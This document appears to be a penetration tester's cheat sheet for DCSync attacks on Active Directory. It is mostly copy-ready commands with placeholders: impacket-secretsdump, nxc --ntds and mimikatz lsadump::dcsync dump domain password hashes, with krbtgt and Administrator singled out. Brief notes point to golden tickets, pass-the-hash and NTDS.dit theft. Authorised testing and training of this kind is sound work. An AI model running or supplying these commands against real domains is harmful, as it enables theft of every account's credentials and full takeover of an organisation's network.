# DCSync

## Before I start
- [ ] An account with replication rights: Domain Admin, Enterprise Admin, Administrators, or a user holding Replicating Directory Changes (All) over the domain object — BloodHound marks it as the DCSync edge
- [ ] Clock: sudo ntpdate <DCIP>
- [ ] PowerView check if unsure: Get-DomainObjectAcl -Identity 'DC=<Domain>,DC=<TLD>' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'}

## Sync from Kali
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc
impacket-secretsdump -hashes ':<Hash>' '<Domain>/<Username>@<DCIP>' -just-dc
One account only:
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc-user '<TargetUser>'
The two that matter most:
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc-user 'krbtgt'
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc-user 'Administrator'
- [ ] krbtgt's NT hash is the golden-ticket key for the whole domain
- [ ] -history adds password history, -pwd-last-set shows age, -user-status shows who is enabled

Through nxc instead:
nxc smb <DCIP> -u '<Username>' -p '<Password>' --ntds
nxc smb <DCIP> -u '<Username>' -p '<Password>' --ntds --user krbtgt
- [ ] nxc default is the drsuapi method: same DCSync, same rights needed

## From a Windows shell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<Domain>\krbtgt" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:<Domain>\<TargetUser>" "exit"
- [ ] /all pulls the entire database; /csv when it needs parsing
- [ ] Runs from any domain host with the rights: no need to touch the DC itself

## What the hashes buy
- [ ] krbtgt hash → golden ticket with no further DC contact: :Pb golden-silver
- [ ] Any user's NT hash → pass-the-hash across the domain: :Pb lateral-movement
- [ ] No replication rights but local admin on the DC? Steal NTDS.dit via shadow copy instead for the same material offline: :Pb privileged-groups
